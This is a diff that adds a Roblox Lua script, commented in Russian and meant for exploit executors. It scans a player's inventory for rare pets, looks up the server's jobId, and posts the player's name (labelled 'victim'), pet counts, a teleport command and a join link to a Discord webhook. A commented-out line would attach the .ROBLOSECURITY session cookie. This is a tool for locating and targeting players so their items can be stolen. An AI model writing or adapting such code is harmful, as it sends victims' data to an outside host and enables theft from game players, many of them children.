@@ -1,0 +1,198 @@
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+
+-- Пути к инвентарю и экипированным петам
+local inventoryPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Container
+local equippedPath = lp.PlayerGui.Tabs.Inventory.Menu.Categories.Pets.Inner.List.Equipped.List
+
+-- Редкости, которые нас интересуют
+local VALID_RARITIES = {
+    ["Mythical"] = true,
+    ["Secret I"] = true,
+    ["Secret II"] = true,
+    ["Secret III"] = true
+}
+
+-- Твой Discord вебхук
+local webhook = "https://discord.com/api/webhooks/ВАШ_ВЕБХУК_ЗДЕСЬ"
+
+-- HTTP requester (synapse, krnl и т.д.)
+local HttpRequest = request or (syn and syn.request) or http_request or (http and http.request)
+
+-- Таблица для подсчёта по редкостям
+local RarityCount = {
+    ["Mythical"] = 0,
+    ["Secret I"] = 0,
+    ["Secret II"] = 0,
+    ["Secret III"] = 0
+}
+local TotalValuablePets = 0
+
+-- Функция сканирования контейнера (инвентарь + экипированные)
+local function scan(container, tag)
+    for _, pet in ipairs(container:GetChildren()) do
+        for _, child in ipairs(pet:GetChildren()) do
+            if VALID_RARITIES[child.Name] then
+                local id = pet:GetAttribute("Id")
+                if id then
+                    RarityCount[child.Name] = RarityCount[child.Name] + 1
+                    TotalValuablePets = TotalValuablePets + 1
+                    print(string.format("[%s] %s — %s | ID: %s", tag, pet.Name, child.Name, id))
+                end
+            end
+        end
+    end
+end
+
+-- Сканируем инвентарь и экипированных
+print("=== Scanning Inventory ===")
+scan(inventoryPath, "Inventory")
+print("=== Scanning Equipped ===")
+scan(equippedPath, "Equipped")
+
+print("Сканирование завершено. Всего ценных петов:", TotalValuablePets)
+
+-- Если ничего ценного не найдено — выходим
+if TotalValuablePets == 0 then
+    print("Нет ценных петов — вебхук не отправляется.")
+    return
+end
+
+-- === Получение jobId через Presence API ===
+local function getPresenceJobId()
+    if not HttpRequest then
+        warn("[PRESENCE] Нет HTTP requester")
+        return nil
+    end
+
+    local userIds = {}
+    local idToName = {}
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= lp then  -- исключаем себя, чтобы не мешал
+            table.insert(userIds, p.UserId)
+            idToName[p.UserId] = p.Name
+        end
+    end
+
+    if #userIds == 0 then return nil end
+
+    local body = HttpService:JSONEncode({userIds = userIds})
+    local headers = {["Content-Type"] = "application/json"}
+
+    -- Если есть кука — добавляем (необязательно, но может помочь)
+    -- if getgenv().Cookie then headers["Cookie"] = ".ROBLOSECURITY=" .. getgenv().Cookie end
+
+    local success, response = pcall(function()
+        return HttpRequest({
+            Url = "https://presence.roblox.com/v1/presence/users",
+            Method = "POST",
+            Headers = headers,
+            Body = body
+        })
+    end)
+
+    if not success or not response or not response.Body then
+        warn("[PRESENCE] Ошибка запроса")
+        return nil
+    end
+
+    local parseSuccess, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
+    if not parseSuccess or not data.userPresences then
+        warn("[PRESENCE] Не удалось распарсить ответ")
+        return nil
+    end
+
+    for _, presence in ipairs(data.userPresences) do
+        if presence.placeId and presence.gameId then
+            return {
+                placeId = tostring(presence.placeId),
+                jobId = tostring(presence.gameId),
+                playerName = idToName[presence.userId] or "Unknown"
+            }
+        end
+    end
+
+    return nil
+end
+
+-- === Отправка в вебхук ===
+local function sendToWebhook(presenceData)
+    if not HttpRequest then return false end
+
+    local placeId = presenceData.placeId
+    local jobId = presenceData.jobId
+
+    -- Формируем список редкостей
+    local rarityLines = {}
+    for rarity, count in pairs(RarityCount) do
+        if count > 0 then
+            table.insert(rarityLines, string.format("**%s**: %d", rarity, count))
+        end
+    end
+
+    local rarityText = table.concat(rarityLines, "\n")
+    if rarityText == "" then rarityText = "Нет данных" end
+
+    -- Команда телепорта
+    local teleportCommand = string.format(
+        "game:GetService('TeleportService'):TeleportToPlaceInstance(%s, '%s')",
+        placeId, jobId
+    )
+
+    local payload = {
+        ["content"] = "@everyone\n" .. teleportCommand,  -- можно убрать @everyone если не нужно
+        ["embeds"] = {{
+            ["title"] = "🎲 Найдены ценные петы!",
+            ["description"] = string.format("**Жертва:** %s\n**Сервер:** %s петов на сервере", lp.Name, #Players:GetPlayers()),
+            ["color"] = 16711680,  -- красный
+            ["fields"] = {
+                {
+                    ["name"] = "Редкости петов:",
+                    ["value"] = rarityText,
+                    ["inline"] = false
+                },
+                {
+                    ["name"] = "Общее количество:",
+                    ["value"] = tostring(TotalValuablePets),
+                    ["inline"] = true
+                },
+                {
+                    ["name"] = "Join link (альтернатива):",
+                    ["value"] = string.format("https://www.roblox.com/games/%s/?jobId=%s", placeId, jobId),
+                    ["inline"] = false
+                }
+            },
+            ["footer"] = {["text"] = "Pet Simulator Scanner | " .. os.date("%Y-%m-%d %H:%M")}
+        }}
+    }
+
+    local body = HttpService:JSONEncode(payload)
+    local success, resp = pcall(function()
+        return HttpRequest({
+            Url = webhook,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = body
+        })
+    end)
+
+    if success and resp and (resp.StatusCode == 200 or resp.StatusCode == 204) then
+        print("[WEBHOOK] Успешно отправлено!")
+        return true
+    else
+        warn("[WEBHOOK] Ошибка отправки:", resp and resp.StatusCode or "unknown")
+        return false
+    end
+end
+
+-- === Основная логика ===
+local presence = getPresenceJobId()
+
+if presence then
+    print("[PRESENCE] Успешно получен jobId:", presence.jobId)
+    sendToWebhook(presence)
+else
+    warn("[PRESENCE] Не удалось получить jobId — вебхук НЕ отправлен.")
+end
